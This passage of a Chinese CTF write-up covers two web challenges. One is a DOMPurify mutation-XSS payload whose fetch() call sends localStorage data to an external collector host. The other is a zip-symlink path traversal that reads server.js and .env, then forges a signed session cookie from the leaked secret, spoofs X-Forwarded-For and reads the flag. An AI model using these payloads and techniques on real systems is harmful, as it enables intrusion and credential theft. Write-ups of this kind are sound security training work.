<p>很好,我们现在能向任意网站获得数据了,我们继续</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;title-div&quot;</span>,<span class="string">&quot;observedAttribute&quot;</span>:<span class="string">&quot;data-id&quot;</span>&#125;]</span><br></pre></td></tr></table></figure>

<p>如果我们监听这种全局属性性呢？<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Reference/Global_attributes/data-*">data-*</a></p>
<p>我发现DOMPurify认为data-id与id都是被允许的,不会删除此属性!</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">ALLOWED_ATTR</span>: [<span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;href&#x27;</span>, <span class="string">&#x27;title&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p><a href="https://jorianwoltjer.com/blog/p/research/mutation-xss">突变 XSS：解释、CVE 和挑战 |乔里安·沃尔特杰</a></p>
<blockquote>
<p>因为特殊原因 DOMPurify 在有些情况无法清理is属性？</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a=new DOMParser().parseFromString(&#x27;&lt;a is=&quot;to-delete&quot;&gt;&#x27;, &quot;text/html&quot;);</span><br><span class="line">a.body.firstChild.removeAttribute(&quot;is&quot;);</span><br><span class="line">a.getRootNode().body.firstChild;</span><br><span class="line">&gt;&gt;&gt; &lt;a&gt;&lt;/a&gt;</span><br><span class="line">a.getRootNode().body.firstChild.outerHTML;</span><br><span class="line">&gt;&gt;&gt; &#x27;&lt;a is=&quot;to-delete&quot;&gt;&lt;/a&gt;&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div is=&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>is成功成为了invalid-value</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;invalid-value&quot;</span><span class="punctuation">,</span><span class="attr">&quot;observedAttribute&quot;</span><span class="punctuation">:</span><span class="string">&quot;data-class&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div data-<span class="keyword">class</span>=some is= &gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>成功了</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div is=<span class="string">&quot;invalid-value&quot;</span> data-<span class="keyword">class</span>=<span class="string">&quot;some&quot;</span>&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;a id=custom_elements&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">custom_elements</span> <span class="attr">name</span>=<span class="string">enabled</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">custom_elements</span> <span class="attr">name</span>=<span class="string">endpoint</span> <span class="attr">href</span>=<span class="string">//kws1oh3y.requestrepo.com</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-class</span>=<span class="string">&quot;&#x27;);fetch(&#x27;https://kws1oh3y.requestrepo.com/?flag=&#x27;+localStorage.getItem(&#x27;flag&#x27;))&lt;!--&quot;</span> <span class="attr">is</span>=&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<h2><span id="slippy">SLIPPY</span><a href="#slippy" class="header-anchor"></a></h2><p>有 <code>/upload</code> 上传接口，且上传后的zip文件会被解压，并可以在 <code>/files</code> 下载解压后的文件</p>
<p>通过将符号链接加到zip文件中可以绕过路径限制读取任意文件</p>
<p>构造zip文件读取远程靶机的 <code>server.js</code> 和 <code>.env</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> app</span><br><span class="line"><span class="built_in">mkdir</span> app/uploads</span><br><span class="line"><span class="built_in">mkdir</span> app/uploads/1</span><br><span class="line"><span class="built_in">touch</span> app/server.js</span><br><span class="line"><span class="built_in">touch</span> app/.env</span><br><span class="line"><span class="built_in">cd</span> app/uploads/1</span><br><span class="line"><span class="built_in">ln</span> -s ../../server.js ./server</span><br><span class="line"><span class="built_in">ln</span> -s ../../.env ./env</span><br><span class="line">zip -y 1.zip ./server ./env</span><br></pre></td></tr></table></figure>

<p>下载 <code>server</code> 和 <code>env</code> 两个文件，获取到 develop 用户的 <code>sid</code> 是 <code>amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E</code> ，以及 <code>SESSION_SECRET=3df35e5dd772dd98a6feb5475d0459f8e18e08a46f48ec68234173663fca377b</code></p>
<p>用下面的脚本伪造 develop 的 cookie</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> signature = <span class="built_in">require</span>(<span class="string">&#x27;cookie-signature&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> secret = <span class="string">&quot;3df35e5dd772dd98a6feb5475d0459f8e18e08a46f48ec68234173663fca377b&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> sid = <span class="string">&quot;amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cookieVal = <span class="string">&#x27;s:&#x27;</span> + signature.<span class="title function_">sign</span>(sid, secret);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;connect.sid=&quot;</span> + cookieVal);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>connect.sid&#x3D;s%3AamwvsLiDgNHm2XXfoynBUNRA2iWoEH5E%2ER3H281arLqbqxxVlw9hWgdoQRZpcJElSLSSn6rdnloE</p>
</blockquote>
<p>修改 cookie ，添加请求头 <code>X-Forwarded-For: 127.0.0.1</code> ，访问 <code>/debug/files?session_id=../../</code> </p>
<p>得到 flag 在 <code>/tlhedn6f</code> 路径下</p>
<p>构造 zip ，加入 <code>../../../tlhedn6f/flag.txt</code> 的符号链接</p>
<p>上传zip文件后下载 flag.txt</p>
</div><div class="article-licensing box"><div class="licensing-title"><p>2025 TFCCTF SU WriteUp</p><p><a href="https://team-su.github.io/posts/a92a3cc3.html">https://team-su.github.io/posts/a92a3cc3.html</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>SUers</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2025-08-31</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2025-08-31</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/posts/e3fd1be7.html"><span class="level-item">2025 L3HCTF SU WriteUp</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><!--!--><div class="column column-right  order-3 is-sticky"><!--!--></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a><p class="is-size-7"><span>&copy; 2025 SUers</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">© 2016</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/team-su"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script type="text/javascript" id="MathJax-script" async>MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      },
      svg: {
        fontCache: 'global'
      },
      chtml: {
        matchFontHeight: false
      }
    };</script><script src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><!--!--></body></html>